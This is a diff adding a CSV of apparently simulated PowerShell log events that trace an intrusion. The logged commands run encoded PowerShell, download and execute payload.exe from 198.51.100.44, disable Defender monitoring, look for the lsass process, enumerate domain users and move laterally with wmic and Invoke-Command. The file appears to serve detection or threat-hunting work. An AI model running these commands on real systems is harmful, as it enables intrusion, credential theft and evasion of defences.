@@ -1,0 +1,12 @@
+timestamp,host,user,event_type,command_line,src_ip,dst_ip,process,file_path
+2024-03-15T02:13:30,WORKSTATION-01,CORP\jsmith,4104,powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0A,10.0.1.50,,powershell.exe,
+2024-03-15T02:13:35,WORKSTATION-01,CORP\jsmith,4103,"Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjAGwAaQBlAG4A')))",10.0.1.50,,powershell.exe,
+2024-03-15T02:13:55,WORKSTATION-01,CORP\jsmith,4104,"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://198.51.100.44/tools/payload.exe','C:\Users\Public\payload.exe')",10.0.1.50,,powershell.exe,
+2024-03-15T02:14:00,WORKSTATION-01,CORP\jsmith,4104,Start-Process 'C:\Users\Public\payload.exe' -WindowStyle Hidden,10.0.1.50,,powershell.exe,C:\Users\Public\payload.exe
+2024-03-15T02:14:20,WORKSTATION-01,CORP\jsmith,4104,Set-MpPreference -DisableRealtimeMonitoring $true,10.0.1.50,,powershell.exe,
+2024-03-15T02:14:50,WORKSTATION-01,CORP\jsmith,4104,Get-Process | Where-Object {$_.Name -eq 'lsass'},10.0.1.50,,powershell.exe,
+2024-03-15T02:15:05,WORKSTATION-01,CORP\jsmith,4104,net user /domain,10.0.1.50,,powershell.exe,
+2024-03-15T02:15:30,WORKSTATION-01,CORP\jsmith,4104,Invoke-WebRequest -Uri http://198.51.100.44/stage2 -Method GET,10.0.1.50,,powershell.exe,
+2024-03-15T02:16:15,SERVER-DC01,CORP\administrator,4104,wmic /node:10.0.1.50 process call create "cmd.exe /c whoami",10.0.1.100,,powershell.exe,
+2024-03-15T02:17:00,SERVER-DC01,CORP\administrator,4103,Get-ADUser -Filter * -Properties *,10.0.1.100,,powershell.exe,
+2024-03-15T02:17:45,SERVER-DC01,CORP\administrator,4104,Invoke-Command -ComputerName WORKSTATION-02 -ScriptBlock {whoami},10.0.1.100,,powershell.exe,
